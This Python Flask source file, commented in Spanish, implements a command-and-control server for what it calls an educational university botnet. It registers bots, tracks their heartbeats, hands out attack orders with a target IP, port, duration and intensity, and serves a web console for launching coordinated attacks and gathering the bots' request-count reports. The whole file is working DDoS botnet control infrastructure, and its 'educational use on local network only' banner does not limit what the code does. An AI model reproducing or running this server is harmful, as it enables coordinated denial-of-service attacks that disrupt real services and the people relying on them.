#!/usr/bin/env python3
"""
Servidor de Comando y Control Simplificado
Para proyecto universitario de botnet educativa
"""

from flask import Flask, request, jsonify
import time
from threading import Lock
import json

app = Flask(__name__)

# Base de datos simple de bots
bots_db = {}
attacks_log = []
db_lock = Lock()

# Configuración
LISTEN_IP = "0.0.0.0"  # Escuchar en todas las interfaces
LISTEN_PORT = 5000

@app.route('/')
def index():
    return """
    <html>
        <head><title>C&C - BotNet Educativa</title></head>
        <body>
            <h1>🤖 Servidor de Comando y Control</h1>
            <p>Bots registrados: {}</p>
            <p><a href="/bots">Ver bots</a></p>
            <p><a href="/attack_console">Consola de ataque</a></p>
        </body>
    </html>
    """.format(len(bots_db))

@app.route('/register', methods=['POST'])
def register_bot():
    try:
        data = request.json
        bot_id = data.get('bot_id', 'unknown')
        
        with db_lock:
            bots_db[bot_id] = {
                'ip': request.remote_addr,
                'last_seen': time.time(),
                'data': data,
                'status': 'active'
            }
        
        print(f"[+] Bot registrado: {bot_id} desde {request.remote_addr}")
        return jsonify({'status': 'success', 'message': 'Registered'})
        
    except Exception as e:
        print(f"[-] Error en registro: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json
        bot_id = data.get('bot_id', 'unknown')
        
        with db_lock:
            if bot_id in bots_db:
                bots_db[bot_id]['last_seen'] = time.time()
                bots_db[bot_id]['status'] = 'active'
                print(f"[.] Heartbeat de {bot_id}")
        
        return jsonify({'status': 'ack'})
        
    except Exception as e:
        return jsonify({'status': 'error'}), 400

@app.route('/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    """Devuelve comandos para un bot específico"""
    # Por ahora, todos reciben el mismo comando
    # En una versión avanzada, podrías tener colas por bot
    
    with db_lock:
        if bot_id not in bots_db:
            return jsonify({'action': 'register'}), 404
    
    # Comando de ejemplo (puedes cambiar esto)
    command = {
        'action': 'attack',
        'target': '192.168.1.100',  # Cambia esto
        'port': 8080,
        'duration': 30,
        'intensity': 10,
        'timestamp': time.time()
    }
    
    return jsonify(command)

@app.route('/send_command', methods=['POST'])
def send_command_all():
    """Envía comando a TODOS los bots"""
    try:
        command = request.json
        
        with db_lock:
            # Guardar el comando para que los bots lo recojan
            for bot_id in bots_db.keys():
                bots_db[bot_id]['last_command'] = command
        
        # Registrar ataque
        attacks_log.append({
            'command': command,
            'timestamp': time.time(),
            'bot_count': len(bots_db)
        })
        
        print(f"[!] Comando enviado a {len(bots_db)} bots: {command}")
        return jsonify({'status': 'sent', 'bots': len(bots_db)})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/bots', methods=['GET'])
def list_bots():
    """Lista todos los bots registrados"""
    with db_lock:
        # Limpiar bots inactivos (más de 5 minutos sin heartbeat)
        current_time = time.time()
        inactive_bots = []
        
        for bot_id, bot_data in list(bots_db.items()):
            if current_time - bot_data['last_seen'] > 300:  # 5 minutos
                inactive_bots.append(bot_id)
        
        for bot_id in inactive_bots:
            del bots_db[bot_id]
    
    return jsonify({
        'active_bots': len(bots_db),
        'bots': bots_db,
        'timestamp': time.time()
    })

@app.route('/attack_console')
def attack_console():
    """Interfaz web simple para enviar comandos"""
    return """
    <html>
        <head>
            <title>Consola de Ataque</title>
            <style>
                body { font-family: Arial; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                input, button { padding: 10px; margin: 5px; }
                .log { background: #222; color: #0f0; padding: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 Consola de Ataque</h1>
                
                <h3>Configurar Ataque:</h3>
                <div>
                    <input type="text" id="target" placeholder="IP Objetivo" value="192.168.1.100">
                    <input type="number" id="port" placeholder="Puerto" value="8080" min="1" max="65535">
                    <br>
                    <input type="number" id="duration" placeholder="Duración (segundos)" value="30" min="1" max="300">
                    <input type="number" id="intensity" placeholder="Intensidad (1-20)" value="10" min="1" max="20">
                    <br><br>
                    <button onclick="sendAttack()">🚀 Ejecutar Ataque Coordinado</button>
                </div>
                
                <h3>Bots Conectados: <span id="botCount">0</span></h3>
                <div id="botList"></div>
                
                <h3>Log:</h3>
                <div class="log" id="log">
                    Servidor iniciado...
                </div>
            </div>
            
            <script>
                function updateBots() {
                    fetch('/bots')
                        .then(r => r.json())
                        .then(data => {
                            document.getElementById('botCount').textContent = data.active_bots;
                            
                            let botList = document.getElementById('botList');
                            botList.innerHTML = '';
                            
                            for (let botId in data.bots) {
                                let bot = data.bots[botId];
                                let lastSeen = Math.floor((Date.now()/1000 - bot.last_seen));
                                botList.innerHTML += `
                                    <div style="border:1px solid #ccc; padding:10px; margin:5px;">
                                        <strong>${botId}</strong><br>
                                        IP: ${bot.ip}<br>
                                        Última vez: ${lastSeen} segundos
                                    </div>
                                `;
                            }
                        });
                }
                
                function sendAttack() {
                    const command = {
                        action: 'attack',
                        target: document.getElementById('target').value,
                        port: parseInt(document.getElementById('port').value),
                        duration: parseInt(document.getElementById('duration').value),
                        intensity: parseInt(document.getElementById('intensity').value)
                    };
                    
                    fetch('/send_command', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(command)
                    })
                    .then(r => r.json())
                    .then(data => {
                        log(`Ataque enviado a ${data.bots} bots`);
                    })
                    .catch(e => log(`Error: ${e}`));
                }
                
                function log(message) {
                    let logDiv = document.getElementById('log');
                    let time = new Date().toLocaleTimeString();
                    logDiv.innerHTML = `[${time}] ${message}<br>` + logDiv.innerHTML;
                }
                
                // Actualizar bots cada 10 segundos
                setInterval(updateBots, 10000);
                updateBots();
            </script>
        </body>
    </html>
    """

@app.route('/attack_report', methods=['POST'])
def attack_report():
    """Recibe reportes de ataques completados"""
    try:
        data = request.json
        print(f"[📊] Reporte de ataque de {data.get('bot_id')}:")
        print(f"    Objetivo: {data.get('target')}")
        print(f"    Requests: {data.get('requests_sent')}")
        print(f"    Duración: {data.get('duration')}s")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"[-] Error en reporte: {e}")
        return jsonify({'status': 'error'}), 400

if __name__ == '__main__':
    print(f"""
    ╔══════════════════════════════════════════╗
    ║     🎮 SERVIDOR C&C - BOTNET EDUCATIVA   ║
    ║                                          ║
    ║  Escuchando en: {LISTEN_IP}:{LISTEN_PORT:<15} ║
    ║  Web Interface: http://localhost:{LISTEN_PORT} ║
    ║                                          ║
    ║  ⚠️  SOLO USO EDUCATIVO EN RED LOCAL    ║
    ╚══════════════════════════════════════════╝
    """)
    
    app.run(host=LISTEN_IP, port=LISTEN_PORT, debug=True)
